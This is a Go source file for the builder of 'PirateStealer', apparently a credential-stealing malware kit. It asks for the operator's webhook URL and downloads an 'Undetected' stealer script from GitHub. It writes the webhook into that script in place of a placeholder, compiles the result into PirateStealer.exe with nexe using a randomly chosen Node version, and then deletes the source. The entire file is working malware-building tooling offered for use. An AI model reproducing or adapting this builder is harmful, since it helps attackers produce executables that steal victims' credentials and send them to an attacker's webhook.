package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/bytixo/PirateStealer/Builder/logger"
)

func main() {
	var webhook string
	logger.Info("Enter Webhook URL:")
	fmt.Scanln(&webhook)
	build(webhook)
}

func build(webhook string) {
	rand.Seed(time.Now().Unix())

	logger.Info("Starting to compile")
	// Check for node
	_, err := exec.Command("node", "-v").Output()
	if err != nil {
		logger.Fatal("You must have node installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program. see: https://nodejs.org/en/download/  | Will exit in 5 seconds", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	logger.Info("Installing deps")

	// Install dependencies
	_, err = exec.Command("npm", "install").Output()
	if err != nil {
		logger.Fatal("Please make sure package.json and package-lock.json are in the same folder that the .exe | Will exit in 5 seconds", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	// Check pkg
	_, err = exec.Command("nexe", "-v").Output()
	if err != nil {
		logger.Info("Installing nexe")
		_, err = exec.Command("npm", "install", "-g", "nexe").Output()
		if err != nil {
			logger.Fatal(`Error while installing nexe, "npm install -g nexe", run this command in cmd please. Will exit in 5 seconds`, err)
			time.Sleep(5 * time.Second)
			os.Exit(1)
		}
	}
	logger.Info("getting code")
	req, err := http.NewRequest("GET", "https://raw.githubusercontent.com/bytixo/PirateStealer/main/src/Undetected/index.js", nil)
	if err != nil {
		logger.Fatal(err)
	}

	httpClient := http.Client{
		Timeout: 5 * time.Second,
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		logger.Fatal(err)
	}
	defer resp.Body.Close()
	r, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		logger.Error(err)
	}
	//replace webhook

	c := strings.Replace(string(r), "da_webhook", webhook, -1)
	err = ioutil.WriteFile("index.js", []byte(c), 0666)
	if err != nil {
		logger.Fatal("Error writing to file", err)
	}
	time.Sleep(time.Second)

	// Compile it
	versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1", "win32-x64-12.9.1"}
	v := versions[rand.Intn(len(versions))]
	t := fmt.Sprintf(`-t %s`, v)
	logger.Info(fmt.Sprintf(`Compiling: nexe %s index.js`, t))
	_, err = exec.Command("nexe", t, "-o", "PirateStealer.exe", "index.js").Output()
	if err != nil {
		logger.Fatal("Error while compiling", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	logger.Info("Program has been compiled with your webhook")
	err = os.Remove("index.js")
	if err != nil {
		logger.Fatal(err)
	}
	time.Sleep(time.Second * 10)
}
